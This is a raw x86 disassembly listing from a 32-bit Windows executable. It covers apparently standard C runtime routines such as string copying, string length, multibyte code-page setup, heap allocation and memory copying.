  4258e0:	jmp    0x4258a9
  4258e2:	mov    DWORD PTR [edi],edx
  4258e4:	mov    eax,DWORD PTR [esp+0x8]
  4258e8:	pop    edi
  4258e9:	ret    
  4258ea:	mov    WORD PTR [edi],dx
  4258ed:	mov    eax,DWORD PTR [esp+0x8]
  4258f1:	mov    BYTE PTR [edi+0x2],0x0
  4258f5:	pop    edi
  4258f6:	ret    
  4258f7:	mov    WORD PTR [edi],dx
  4258fa:	mov    eax,DWORD PTR [esp+0x8]
  4258fe:	pop    edi
  4258ff:	ret    
  425900:	mov    BYTE PTR [edi],dl
  425902:	mov    eax,DWORD PTR [esp+0x8]
  425906:	pop    edi
  425907:	ret    
  425908:	int3   
  425909:	int3   
  42590a:	int3   
  42590b:	int3   
  42590c:	int3   
  42590d:	int3   
  42590e:	int3   
  42590f:	int3   
  425910:	mov    ecx,DWORD PTR [esp+0xc]
  425914:	push   edi
  425915:	test   ecx,ecx
  425917:	je     0x4259af
  42591d:	push   esi
  42591e:	push   ebx
  42591f:	mov    ebx,ecx
  425921:	mov    esi,DWORD PTR [esp+0x14]
  425925:	test   esi,0x3
  42592b:	mov    edi,DWORD PTR [esp+0x10]
  42592f:	jne    0x42593c
  425931:	shr    ecx,0x2
  425934:	jne    0x4259bf
  42593a:	jmp    0x425963
  42593c:	mov    al,BYTE PTR [esi]
  42593e:	add    esi,0x1
  425941:	mov    BYTE PTR [edi],al
  425943:	add    edi,0x1
  425946:	sub    ecx,0x1
  425949:	je     0x425976
  42594b:	test   al,al
  42594d:	je     0x42597e
  42594f:	test   esi,0x3
  425955:	jne    0x42593c
  425957:	mov    ebx,ecx
  425959:	shr    ecx,0x2
  42595c:	jne    0x4259bf
  42595e:	and    ebx,0x3
  425961:	je     0x425976
  425963:	mov    al,BYTE PTR [esi]
  425965:	add    esi,0x1
  425968:	mov    BYTE PTR [edi],al
  42596a:	add    edi,0x1
  42596d:	test   al,al
  42596f:	je     0x4259a8
  425971:	sub    ebx,0x1
  425974:	jne    0x425963
  425976:	mov    eax,DWORD PTR [esp+0x10]
  42597a:	pop    ebx
  42597b:	pop    esi
  42597c:	pop    edi
  42597d:	ret    
  42597e:	test   edi,0x3
  425984:	je     0x42599c
  425986:	mov    BYTE PTR [edi],al
  425988:	add    edi,0x1
  42598b:	sub    ecx,0x1
  42598e:	je     0x425a2c
  425994:	test   edi,0x3
  42599a:	jne    0x425986
  42599c:	mov    ebx,ecx
  42599e:	shr    ecx,0x2
  4259a1:	jne    0x425a17
  4259a3:	mov    BYTE PTR [edi],al
  4259a5:	add    edi,0x1
  4259a8:	sub    ebx,0x1
  4259ab:	jne    0x4259a3
  4259ad:	pop    ebx
  4259ae:	pop    esi
  4259af:	mov    eax,DWORD PTR [esp+0x8]
  4259b3:	pop    edi
  4259b4:	ret    
  4259b5:	mov    DWORD PTR [edi],edx
  4259b7:	add    edi,0x4
  4259ba:	sub    ecx,0x1
  4259bd:	je     0x42595e
  4259bf:	mov    edx,0x7efefeff
  4259c4:	mov    eax,DWORD PTR [esi]
  4259c6:	add    edx,eax
  4259c8:	xor    eax,0xffffffff
  4259cb:	xor    eax,edx
  4259cd:	mov    edx,DWORD PTR [esi]
  4259cf:	add    esi,0x4
  4259d2:	test   eax,0x81010100
  4259d7:	je     0x4259b5
  4259d9:	test   dl,dl
  4259db:	je     0x425a09
  4259dd:	test   dh,dh
  4259df:	je     0x4259ff
  4259e1:	test   edx,0xff0000
  4259e7:	je     0x4259f5
  4259e9:	test   edx,0xff000000
  4259ef:	jne    0x4259b5
  4259f1:	mov    DWORD PTR [edi],edx
  4259f3:	jmp    0x425a0d
  4259f5:	and    edx,0xffff
  4259fb:	mov    DWORD PTR [edi],edx
  4259fd:	jmp    0x425a0d
  4259ff:	and    edx,0xff
  425a05:	mov    DWORD PTR [edi],edx
  425a07:	jmp    0x425a0d
  425a09:	xor    edx,edx
  425a0b:	mov    DWORD PTR [edi],edx
  425a0d:	add    edi,0x4
  425a10:	xor    eax,eax
  425a12:	sub    ecx,0x1
  425a15:	je     0x425a23
  425a17:	xor    eax,eax
  425a19:	mov    DWORD PTR [edi],eax
  425a1b:	add    edi,0x4
  425a1e:	sub    ecx,0x1
  425a21:	jne    0x425a19
  425a23:	and    ebx,0x3
  425a26:	jne    0x4259a3
  425a2c:	mov    eax,DWORD PTR [esp+0x10]
  425a30:	pop    ebx
  425a31:	pop    esi
  425a32:	pop    edi
  425a33:	ret    
  425a34:	int3   
  425a35:	int3   
  425a36:	int3   
  425a37:	int3   
  425a38:	int3   
  425a39:	int3   
  425a3a:	int3   
  425a3b:	int3   
  425a3c:	int3   
  425a3d:	int3   
  425a3e:	int3   
  425a3f:	int3   
  425a40:	mov    ecx,DWORD PTR [esp+0x4]
  425a44:	test   ecx,0x3
  425a4a:	je     0x425a70
  425a4c:	mov    al,BYTE PTR [ecx]
  425a4e:	add    ecx,0x1
  425a51:	test   al,al
  425a53:	je     0x425aa3
  425a55:	test   ecx,0x3
  425a5b:	jne    0x425a4c
  425a5d:	add    eax,0x0
  425a62:	lea    esp,[esp+0x0]
  425a69:	lea    esp,[esp+0x0]
  425a70:	mov    eax,DWORD PTR [ecx]
  425a72:	mov    edx,0x7efefeff
  425a77:	add    edx,eax
  425a79:	xor    eax,0xffffffff
  425a7c:	xor    eax,edx
  425a7e:	add    ecx,0x4
  425a81:	test   eax,0x81010100
  425a86:	je     0x425a70
  425a88:	mov    eax,DWORD PTR [ecx-0x4]
  425a8b:	test   al,al
  425a8d:	je     0x425ac1
  425a8f:	test   ah,ah
  425a91:	je     0x425ab7
  425a93:	test   eax,0xff0000
  425a98:	je     0x425aad
  425a9a:	test   eax,0xff000000
  425a9f:	je     0x425aa3
  425aa1:	jmp    0x425a70
  425aa3:	lea    eax,[ecx-0x1]
  425aa6:	mov    ecx,DWORD PTR [esp+0x4]
  425aaa:	sub    eax,ecx
  425aac:	ret    
  425aad:	lea    eax,[ecx-0x2]
  425ab0:	mov    ecx,DWORD PTR [esp+0x4]
  425ab4:	sub    eax,ecx
  425ab6:	ret    
  425ab7:	lea    eax,[ecx-0x3]
  425aba:	mov    ecx,DWORD PTR [esp+0x4]
  425abe:	sub    eax,ecx
  425ac0:	ret    
  425ac1:	lea    eax,[ecx-0x4]
  425ac4:	mov    ecx,DWORD PTR [esp+0x4]
  425ac8:	sub    eax,ecx
  425aca:	ret    
  425acb:	push   0x8
  425acd:	push   0x429698
  425ad2:	call   0x425434
  425ad7:	and    DWORD PTR [ebp-0x4],0x0
  425adb:	push   0x0
  425add:	push   0x1
  425adf:	call   0x427652
  425ae4:	pop    ecx
  425ae5:	pop    ecx
  425ae6:	jmp    0x425aef
  425ae8:	xor    eax,eax
  425aea:	inc    eax
  425aeb:	ret    
  425aec:	mov    esp,DWORD PTR [ebp-0x18]
  425aef:	or     DWORD PTR [ebp-0x4],0xffffffff
  425af3:	push   0x3
  425af5:	call   DWORD PTR ds:0x42909c
  425afb:	int3   
  425afc:	cmp    ecx,DWORD PTR ds:0x462f30
  425b02:	jne    0x425b05
  425b04:	ret    
  425b05:	jmp    0x425acb
  425b0a:	movzx  eax,BYTE PTR [esp+0x4]
  425b0f:	mov    cl,BYTE PTR [esp+0xc]
  425b13:	test   BYTE PTR [eax+0x463a21],cl
  425b19:	jne    0x425b37
  425b1b:	cmp    DWORD PTR [esp+0x8],0x0
  425b20:	je     0x425b30
  425b22:	movzx  eax,WORD PTR [eax*2+0x429a92]
  425b2a:	and    eax,DWORD PTR [esp+0x8]
  425b2e:	jmp    0x425b32
  425b30:	xor    eax,eax
  425b32:	test   eax,eax
  425b34:	jne    0x425b37
  425b36:	ret    
  425b37:	xor    eax,eax
  425b39:	inc    eax
  425b3a:	ret    
  425b3b:	push   0x4
  425b3d:	push   0x0
  425b3f:	push   DWORD PTR [esp+0xc]
  425b43:	call   0x425b0a
  425b48:	add    esp,0xc
  425b4b:	ret    
  425b4c:	sub    eax,0x3a4
  425b51:	je     0x425b75
  425b53:	sub    eax,0x4
  425b56:	je     0x425b6f
  425b58:	sub    eax,0xd
  425b5b:	je     0x425b69
  425b5d:	dec    eax
  425b5e:	je     0x425b63
  425b60:	xor    eax,eax
  425b62:	ret    
  425b63:	mov    eax,0x404
  425b68:	ret    
  425b69:	mov    eax,0x412
  425b6e:	ret    
  425b6f:	mov    eax,0x804
  425b74:	ret    
  425b75:	mov    eax,0x411
  425b7a:	ret    
  425b7b:	push   edi
  425b7c:	push   0x40
  425b7e:	xor    eax,eax
  425b80:	pop    ecx
  425b81:	mov    edi,0x463a20
  425b86:	rep stos DWORD PTR es:[edi],eax
  425b88:	stos   BYTE PTR es:[edi],al
  425b89:	xor    eax,eax
  425b8b:	mov    ds:0x463b24,eax
  425b90:	mov    ds:0x463a1c,eax
  425b95:	mov    ds:0x463a14,eax
  425b9a:	mov    edi,0x463b30
  425b9f:	stos   DWORD PTR es:[edi],eax
  425ba0:	stos   DWORD PTR es:[edi],eax
  425ba1:	stos   DWORD PTR es:[edi],eax
  425ba2:	pop    edi
  425ba3:	ret    
  425ba4:	push   ebp
  425ba5:	mov    ebp,esp
  425ba7:	sub    esp,0x518
  425bad:	mov    eax,ds:0x462f30
  425bb2:	xor    eax,DWORD PTR [ebp+0x4]
  425bb5:	push   esi
  425bb6:	mov    DWORD PTR [ebp-0x4],eax
  425bb9:	lea    eax,[ebp-0x18]
  425bbc:	push   eax
  425bbd:	push   DWORD PTR ds:0x463b24
  425bc3:	call   DWORD PTR ds:0x429104
  425bc9:	cmp    eax,0x1
  425bcc:	mov    esi,0x100
  425bd1:	jne    0x425ce4
  425bd7:	xor    eax,eax
  425bd9:	mov    BYTE PTR [ebp+eax*1-0x118],al
  425be0:	inc    eax
  425be1:	cmp    eax,esi
  425be3:	jb     0x425bd9
  425be5:	mov    al,BYTE PTR [ebp-0x12]
  425be8:	test   al,al
  425bea:	mov    BYTE PTR [ebp-0x118],0x20
  425bf1:	je     0x425c29
  425bf3:	push   ebx
  425bf4:	lea    edx,[ebp-0x11]
  425bf7:	push   edi
  425bf8:	movzx  ecx,BYTE PTR [edx]
  425bfb:	movzx  eax,al
  425bfe:	cmp    eax,ecx
  425c00:	ja     0x425c1f
  425c02:	sub    ecx,eax
  425c04:	inc    ecx
  425c05:	mov    ebx,ecx
  425c07:	shr    ecx,0x2
  425c0a:	lea    edi,[ebp+eax*1-0x118]
  425c11:	mov    eax,0x20202020
  425c16:	rep stos DWORD PTR es:[edi],eax
  425c18:	mov    ecx,ebx
  425c1a:	and    ecx,0x3
  425c1d:	rep stos BYTE PTR es:[edi],al
  425c1f:	inc    edx
  425c20:	mov    al,BYTE PTR [edx]
  425c22:	inc    edx
  425c23:	test   al,al
  425c25:	jne    0x425bf8
  425c27:	pop    edi
  425c28:	pop    ebx
  425c29:	push   0x0
  425c2b:	push   DWORD PTR ds:0x463a14
  425c31:	lea    eax,[ebp-0x518]
  425c37:	push   DWORD PTR ds:0x463b24
  425c3d:	push   eax
  425c3e:	push   esi
  425c3f:	lea    eax,[ebp-0x118]
  425c45:	push   eax
  425c46:	push   0x1
  425c48:	call   0x427b58
  425c4d:	push   0x0
  425c4f:	push   DWORD PTR ds:0x463b24
  425c55:	lea    eax,[ebp-0x218]
  425c5b:	push   esi
  425c5c:	push   eax
  425c5d:	push   esi
  425c5e:	lea    eax,[ebp-0x118]
  425c64:	push   eax
  425c65:	push   esi
  425c66:	push   DWORD PTR ds:0x463a14
  425c6c:	call   0x42779c
  425c71:	push   0x0
  425c73:	push   DWORD PTR ds:0x463b24
  425c79:	lea    eax,[ebp-0x318]
  425c7f:	push   esi
  425c80:	push   eax
  425c81:	push   esi
  425c82:	lea    eax,[ebp-0x118]
  425c88:	push   eax
  425c89:	push   0x200
  425c8e:	push   DWORD PTR ds:0x463a14
  425c94:	call   0x42779c
  425c99:	add    esp,0x5c
  425c9c:	xor    eax,eax
  425c9e:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  425ca6:	test   cl,0x1
  425ca9:	je     0x425cc1
  425cab:	or     BYTE PTR [eax+0x463a21],0x10
  425cb2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  425cb9:	mov    BYTE PTR [eax+0x463b40],cl
  425cbf:	jmp    0x425cdd
  425cc1:	test   cl,0x2
  425cc4:	je     0x425cd6
  425cc6:	or     BYTE PTR [eax+0x463a21],0x20
  425ccd:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  425cd4:	jmp    0x425cb9
  425cd6:	and    BYTE PTR [eax+0x463b40],0x0
  425cdd:	inc    eax
  425cde:	cmp    eax,esi
  425ce0:	jb     0x425c9e
  425ce2:	jmp    0x425d28
  425ce4:	xor    eax,eax
  425ce6:	cmp    eax,0x41
  425ce9:	jb     0x425d04
  425ceb:	cmp    eax,0x5a
  425cee:	ja     0x425d04
  425cf0:	or     BYTE PTR [eax+0x463a21],0x10
  425cf7:	mov    cl,al
  425cf9:	add    cl,0x20
  425cfc:	mov    BYTE PTR [eax+0x463b40],cl
  425d02:	jmp    0x425d23
  425d04:	cmp    eax,0x61
  425d07:	jb     0x425d1c
  425d09:	cmp    eax,0x7a
  425d0c:	ja     0x425d1c
  425d0e:	or     BYTE PTR [eax+0x463a21],0x20
  425d15:	mov    cl,al
  425d17:	sub    cl,0x20
  425d1a:	jmp    0x425cfc
  425d1c:	and    BYTE PTR [eax+0x463b40],0x0
  425d23:	inc    eax
  425d24:	cmp    eax,esi
  425d26:	jb     0x425ce6
  425d28:	mov    ecx,DWORD PTR [ebp-0x4]
  425d2b:	xor    ecx,DWORD PTR [ebp+0x4]
  425d2e:	pop    esi
  425d2f:	call   0x425afc
  425d34:	leave  
  425d35:	ret    
  425d36:	push   ebp
  425d37:	mov    ebp,esp
  425d39:	sub    esp,0x1c
  425d3c:	mov    eax,ds:0x462f30
  425d41:	xor    eax,DWORD PTR [ebp+0x4]
  425d44:	push   ebx
  425d45:	push   esi
  425d46:	mov    esi,DWORD PTR [ebp+0x8]
  425d49:	xor    ebx,ebx
  425d4b:	cmp    esi,ebx
  425d4d:	mov    DWORD PTR [ebp-0x4],eax
  425d50:	push   edi
  425d51:	je     0x425eab
  425d57:	xor    edx,edx
  425d59:	xor    eax,eax
  425d5b:	cmp    DWORD PTR [eax+0x462f40],esi
  425d61:	je     0x425dc8
  425d63:	add    eax,0x30
  425d66:	inc    edx
  425d67:	cmp    eax,0xf0
  425d6c:	jb     0x425d5b
  425d6e:	lea    eax,[ebp-0x1c]
  425d71:	push   eax
  425d72:	push   esi
  425d73:	call   DWORD PTR ds:0x429104
  425d79:	cmp    eax,0x1
  425d7c:	jne    0x425ea3
  425d82:	push   0x40
  425d84:	xor    eax,eax
  425d86:	cmp    DWORD PTR [ebp-0x1c],0x1
  425d8a:	pop    ecx
  425d8b:	mov    edi,0x463a20
  425d90:	rep stos DWORD PTR es:[edi],eax
  425d92:	stos   BYTE PTR es:[edi],al
  425d93:	mov    DWORD PTR ds:0x463b24,esi
  425d99:	mov    DWORD PTR ds:0x463a14,ebx
  425d9f:	jbe    0x425e91
  425da5:	cmp    BYTE PTR [ebp-0x16],0x0
  425da9:	je     0x425e69
  425daf:	lea    ecx,[ebp-0x15]
  425db2:	mov    dl,BYTE PTR [ecx]
  425db4:	test   dl,dl
  425db6:	je     0x425e69
  425dbc:	movzx  eax,BYTE PTR [ecx-0x1]
  425dc0:	movzx  edx,dl
  425dc3:	jmp    0x425e59
  425dc8:	push   0x40
  425dca:	xor    eax,eax
  425dcc:	pop    ecx
  425dcd:	mov    edi,0x463a20
  425dd2:	rep stos DWORD PTR es:[edi],eax
  425dd4:	lea    ecx,[edx+edx*2]
  425dd7:	shl    ecx,0x4
  425dda:	mov    DWORD PTR [ebp-0x8],ebx
  425ddd:	stos   BYTE PTR es:[edi],al
  425dde:	lea    ebx,[ecx+0x462f50]
  425de4:	mov    al,BYTE PTR [ebx]
  425de6:	mov    esi,ebx
  425de8:	jmp    0x425e13
  425dea:	mov    dl,BYTE PTR [esi+0x1]
  425ded:	test   dl,dl
  425def:	je     0x425e17
  425df1:	movzx  eax,al
  425df4:	movzx  edi,dl
  425df7:	cmp    eax,edi
  425df9:	ja     0x425e0f
  425dfb:	mov    edx,DWORD PTR [ebp-0x8]
  425dfe:	mov    dl,BYTE PTR [edx+0x462f38]
  425e04:	or     BYTE PTR [eax+0x463a21],dl
  425e0a:	inc    eax
  425e0b:	cmp    eax,edi
  425e0d:	jbe    0x425e04
  425e0f:	inc    esi
  425e10:	inc    esi
  425e11:	mov    al,BYTE PTR [esi]
  425e13:	test   al,al
  425e15:	jne    0x425dea
  425e17:	inc    DWORD PTR [ebp-0x8]
  425e1a:	add    ebx,0x8
  425e1d:	cmp    DWORD PTR [ebp-0x8],0x4
  425e21:	jb     0x425de4
  425e23:	mov    eax,DWORD PTR [ebp+0x8]
  425e26:	mov    ds:0x463b24,eax
  425e2b:	mov    DWORD PTR ds:0x463a1c,0x1
  425e35:	call   0x425b4c
  425e3a:	lea    ecx,[ecx+0x462f44]
  425e40:	mov    esi,ecx
  425e42:	mov    edi,0x463b30
  425e47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e49:	mov    ds:0x463a14,eax
  425e4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e4f:	jmp    0x425eb0
  425e51:	or     BYTE PTR [eax+0x463a21],0x4
  425e58:	inc    eax
  425e59:	cmp    eax,edx
  425e5b:	jbe    0x425e51
  425e5d:	inc    ecx
  425e5e:	inc    ecx
  425e5f:	cmp    BYTE PTR [ecx-0x1],0x0
  425e63:	jne    0x425db2
  425e69:	xor    ecx,ecx
  425e6b:	inc    ecx
  425e6c:	mov    eax,ecx
  425e6e:	or     BYTE PTR [eax+0x463a21],0x8
  425e75:	inc    eax
  425e76:	cmp    eax,0xff
  425e7b:	jb     0x425e6e
  425e7d:	mov    eax,esi
  425e7f:	call   0x425b4c
  425e84:	mov    ds:0x463a14,eax
  425e89:	mov    DWORD PTR ds:0x463a1c,ecx
  425e8f:	jmp    0x425e97
  425e91:	mov    DWORD PTR ds:0x463a1c,ebx
  425e97:	xor    eax,eax
  425e99:	mov    edi,0x463b30
  425e9e:	stos   DWORD PTR es:[edi],eax
  425e9f:	stos   DWORD PTR es:[edi],eax
  425ea0:	stos   DWORD PTR es:[edi],eax
  425ea1:	jmp    0x425eb0
  425ea3:	cmp    DWORD PTR ds:0x463884,ebx
  425ea9:	je     0x425eb9
  425eab:	call   0x425b7b
  425eb0:	call   0x425ba4
  425eb5:	xor    eax,eax
  425eb7:	jmp    0x425ebc
  425eb9:	or     eax,0xffffffff
  425ebc:	mov    ecx,DWORD PTR [ebp-0x4]
  425ebf:	xor    ecx,DWORD PTR [ebp+0x4]
  425ec2:	pop    edi
  425ec3:	pop    esi
  425ec4:	pop    ebx
  425ec5:	call   0x425afc
  425eca:	leave  
  425ecb:	ret    
  425ecc:	push   0x14
  425ece:	push   0x4296a8
  425ed3:	call   0x425434
  425ed8:	or     DWORD PTR [ebp-0x1c],0xffffffff
  425edc:	push   0xd
  425ede:	call   0x4255ef
  425ee3:	pop    ecx
  425ee4:	xor    edi,edi
  425ee6:	mov    DWORD PTR [ebp-0x4],edi
  425ee9:	mov    DWORD PTR ds:0x463884,edi
  425eef:	mov    eax,DWORD PTR [ebp+0x8]
  425ef2:	cmp    eax,0xfffffffe
  425ef5:	jne    0x425f09
  425ef7:	mov    DWORD PTR ds:0x463884,0x1
  425f01:	call   DWORD PTR ds:0x429100
  425f07:	jmp    0x425f34
  425f09:	cmp    eax,0xfffffffd
  425f0c:	jne    0x425f20
  425f0e:	mov    DWORD PTR ds:0x463884,0x1
  425f18:	call   DWORD PTR ds:0x4290fc
  425f1e:	jmp    0x425f34
  425f20:	cmp    eax,0xfffffffc
  425f23:	jne    0x425f34
  425f25:	mov    DWORD PTR ds:0x463884,0x1
  425f2f:	mov    eax,ds:0x4638b4
  425f34:	mov    DWORD PTR [ebp+0x8],eax
  425f37:	cmp    eax,DWORD PTR ds:0x463b24
  425f3d:	je     0x425ffe
  425f43:	mov    esi,DWORD PTR ds:0x463a18
  425f49:	mov    DWORD PTR [ebp-0x20],esi
  425f4c:	cmp    esi,edi
  425f4e:	je     0x425f54
  425f50:	cmp    DWORD PTR [esi],edi
  425f52:	je     0x425f64
  425f54:	push   0x220
  425f59:	call   0x426152
  425f5e:	pop    ecx
  425f5f:	mov    esi,eax
  425f61:	mov    DWORD PTR [ebp-0x20],esi
  425f64:	cmp    esi,edi
  425f66:	je     0x425fe7
  425f68:	push   DWORD PTR [ebp+0x8]
  425f6b:	call   0x425d36
  425f70:	pop    ecx
  425f71:	mov    DWORD PTR [ebp-0x1c],eax
  425f74:	cmp    eax,edi
  425f76:	jne    0x425fe7
  425f78:	mov    DWORD PTR [esi],edi
  425f7a:	mov    eax,ds:0x463b24
  425f7f:	mov    DWORD PTR [esi+0x4],eax
  425f82:	mov    eax,ds:0x463a1c
  425f87:	mov    DWORD PTR [esi+0x8],eax
  425f8a:	mov    eax,ds:0x463a14
  425f8f:	mov    DWORD PTR [esi+0xc],eax
  425f92:	xor    eax,eax
  425f94:	mov    DWORD PTR [ebp-0x24],eax
  425f97:	cmp    eax,0x5
  425f9a:	jge    0x425fac
  425f9c:	mov    cx,WORD PTR [eax*2+0x463b30]
  425fa4:	mov    WORD PTR [esi+eax*2+0x10],cx
  425fa9:	inc    eax
  425faa:	jmp    0x425f94
  425fac:	xor    eax,eax
  425fae:	mov    DWORD PTR [ebp-0x24],eax
  425fb1:	cmp    eax,0x101
  425fb6:	jge    0x425fc5
  425fb8:	mov    cl,BYTE PTR [eax+0x463a20]
  425fbe:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  425fc2:	inc    eax
  425fc3:	jmp    0x425fae
  425fc5:	xor    eax,eax
  425fc7:	mov    DWORD PTR [ebp-0x24],eax
  425fca:	cmp    eax,0x100
  425fcf:	jge    0x425fe1
  425fd1:	mov    cl,BYTE PTR [eax+0x463b40]
  425fd7:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  425fde:	inc    eax
  425fdf:	jmp    0x425fc7
  425fe1:	mov    DWORD PTR ds:0x463a18,esi
  425fe7:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  425feb:	jne    0x426001
  425fed:	cmp    esi,DWORD PTR ds:0x463a18
  425ff3:	je     0x426001
  425ff5:	push   esi
  425ff6:	call   0x42603a
  425ffb:	pop    ecx
  425ffc:	jmp    0x426001
  425ffe:	mov    DWORD PTR [ebp-0x1c],edi
  426001:	or     DWORD PTR [ebp-0x4],0xffffffff
  426005:	call   0x426013
  42600a:	mov    eax,DWORD PTR [ebp-0x1c]
  42600d:	call   0x42546f
  426012:	ret    
  426013:	push   0xd
  426015:	call   0x42555b
  42601a:	pop    ecx
  42601b:	ret    
  42601c:	cmp    DWORD PTR ds:0x463d6c,0x0
  426023:	jne    0x426037
  426025:	push   0xfffffffd
  426027:	call   0x425ecc
  42602c:	pop    ecx
  42602d:	mov    DWORD PTR ds:0x463d6c,0x1
  426037:	xor    eax,eax
  426039:	ret    
  42603a:	push   0xc
  42603c:	push   0x4296b8
  426041:	call   0x425434
  426046:	mov    esi,DWORD PTR [ebp+0x8]
  426049:	test   esi,esi
  42604b:	je     0x4260a5
  42604d:	cmp    DWORD PTR ds:0x463c44,0x3
  426054:	jne    0x426096
  426056:	push   0x4
  426058:	call   0x4255ef
  42605d:	pop    ecx
  42605e:	and    DWORD PTR [ebp-0x4],0x0
  426062:	push   esi
  426063:	call   0x426812
  426068:	pop    ecx
  426069:	mov    DWORD PTR [ebp-0x1c],eax
  42606c:	test   eax,eax
  42606e:	je     0x426079
  426070:	push   esi
  426071:	push   eax
  426072:	call   0x42683d
  426077:	pop    ecx
  426078:	pop    ecx
  426079:	or     DWORD PTR [ebp-0x4],0xffffffff
  42607d:	call   0x42608d
  426082:	cmp    DWORD PTR [ebp-0x1c],0x0
  426086:	jne    0x4260a5
  426088:	push   DWORD PTR [ebp+0x8]
  42608b:	jmp    0x426097
  42608d:	push   0x4
  42608f:	call   0x42555b
  426094:	pop    ecx
  426095:	ret    
  426096:	push   esi
  426097:	push   0x0
  426099:	push   DWORD PTR ds:0x463c40
  42609f:	call   DWORD PTR ds:0x429034
  4260a5:	call   0x42546f
  4260aa:	ret    
  4260ab:	push   0xc
  4260ad:	push   0x4296c8
  4260b2:	call   0x425434
  4260b7:	mov    esi,DWORD PTR [ebp+0x8]
  4260ba:	cmp    DWORD PTR ds:0x463c44,0x3
  4260c1:	jne    0x4260f1
  4260c3:	cmp    esi,DWORD PTR ds:0x463a04
  4260c9:	ja     0x4260f1
  4260cb:	push   0x4
  4260cd:	call   0x4255ef
  4260d2:	pop    ecx
  4260d3:	and    DWORD PTR [ebp-0x4],0x0
  4260d7:	push   esi
  4260d8:	call   0x426ff1
  4260dd:	pop    ecx
  4260de:	mov    DWORD PTR [ebp-0x1c],eax
  4260e1:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260e5:	call   0x42611d
  4260ea:	mov    eax,DWORD PTR [ebp-0x1c]
  4260ed:	test   eax,eax
  4260ef:	jne    0x426114
  4260f1:	test   esi,esi
  4260f3:	jne    0x4260f6
  4260f5:	inc    esi
  4260f6:	cmp    DWORD PTR ds:0x463c44,0x1
  4260fd:	je     0x426105
  4260ff:	add    esi,0xf
  426102:	and    esi,0xfffffff0
  426105:	push   esi
  426106:	push   0x0
  426108:	push   DWORD PTR ds:0x463c40
  42610e:	call   DWORD PTR ds:0x429038
  426114:	call   0x42546f
  426119:	ret    
  42611a:	mov    esi,DWORD PTR [ebp+0x8]
  42611d:	push   0x4
  42611f:	call   0x42555b
  426124:	pop    ecx
  426125:	ret    
  426126:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42612b:	ja     0x42614f
  42612d:	push   DWORD PTR [esp+0x4]
  426131:	call   0x4260ab
  426136:	test   eax,eax
  426138:	pop    ecx
  426139:	jne    0x426151
  42613b:	cmp    DWORD PTR [esp+0x8],eax
  42613f:	je     0x426151
  426141:	push   DWORD PTR [esp+0x4]
  426145:	call   0x427d12
  42614a:	test   eax,eax
  42614c:	pop    ecx
  42614d:	jne    0x42612d
  42614f:	xor    eax,eax
  426151:	ret    
  426152:	push   DWORD PTR ds:0x4638c8
  426158:	push   DWORD PTR [esp+0x8]
  42615c:	call   0x426126
  426161:	pop    ecx
  426162:	pop    ecx
  426163:	ret    
  426164:	int3   
  426165:	int3   
  426166:	int3   
  426167:	int3   
  426168:	int3   
  426169:	int3   
  42616a:	int3   
  42616b:	int3   
  42616c:	int3   
  42616d:	int3   
  42616e:	int3   
  42616f:	int3   
  426170:	push   ebp
  426171:	mov    ebp,esp
  426173:	push   edi
  426174:	push   esi
  426175:	mov    esi,DWORD PTR [ebp+0xc]
  426178:	mov    ecx,DWORD PTR [ebp+0x10]
  42617b:	mov    edi,DWORD PTR [ebp+0x8]
  42617e:	mov    eax,ecx
  426180:	mov    edx,ecx
  426182:	add    eax,esi
  426184:	cmp    edi,esi
  426186:	jbe    0x426190
  426188:	cmp    edi,eax
  42618a:	jb     0x42630c
  426190:	test   edi,0x3
  426196:	jne    0x4261ac
  426198:	shr    ecx,0x2
  42619b:	and    edx,0x3
  42619e:	cmp    ecx,0x8
  4261a1:	jb     0x4261cc
  4261a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4261a5:	jmp    DWORD PTR [edx*4+0x4262bc]
  4261ac:	mov    eax,edi
  4261ae:	mov    edx,0x3
  4261b3:	sub    ecx,0x4
  4261b6:	jb     0x4261c4
  4261b8:	and    eax,0x3
  4261bb:	add    ecx,eax
  4261bd:	jmp    DWORD PTR [eax*4+0x4261d0]
  4261c4:	jmp    DWORD PTR [ecx*4+0x4262cc]
  4261cb:	nop
  4261cc:	jmp    DWORD PTR [ecx*4+0x426250]
  4261d3:	nop
  4261d4:	loopne 0x426237
  4261d6:	inc    edx
  4261d7:	add    BYTE PTR [edx+eiz*2],cl
  4261da:	inc    edx
  4261db:	add    BYTE PTR [eax],dh
  4261dd:	bound  eax,QWORD PTR [edx+0x0]
  4261e0:	and    edx,ecx
  4261e2:	mov    al,BYTE PTR [esi]
  4261e4:	mov    BYTE PTR [edi],al
  4261e6:	mov    al,BYTE PTR [esi+0x1]
  4261e9:	mov    BYTE PTR [edi+0x1],al
  4261ec:	mov    al,BYTE PTR [esi+0x2]
  4261ef:	shr    ecx,0x2
  4261f2:	mov    BYTE PTR [edi+0x2],al
  4261f5:	add    esi,0x3
  4261f8:	add    edi,0x3
  4261fb:	cmp    ecx,0x8
  4261fe:	jb     0x4261cc
  426200:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426202:	jmp    DWORD PTR [edx*4+0x4262bc]
  426209:	lea    ecx,[ecx+0x0]
  42620c:	and    edx,ecx
  42620e:	mov    al,BYTE PTR [esi]
  426210:	mov    BYTE PTR [edi],al
  426212:	mov    al,BYTE PTR [esi+0x1]
  426215:	shr    ecx,0x2
  426218:	mov    BYTE PTR [edi+0x1],al
  42621b:	add    esi,0x2
  42621e:	add    edi,0x2
  426221:	cmp    ecx,0x8
  426224:	jb     0x4261cc
  426226:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426228:	jmp    DWORD PTR [edx*4+0x4262bc]
  42622f:	nop
  426230:	and    edx,ecx
  426232:	mov    al,BYTE PTR [esi]
  426234:	mov    BYTE PTR [edi],al
  426236:	add    esi,0x1
  426239:	shr    ecx,0x2
  42623c:	add    edi,0x1
  42623f:	cmp    ecx,0x8
  426242:	jb     0x4261cc
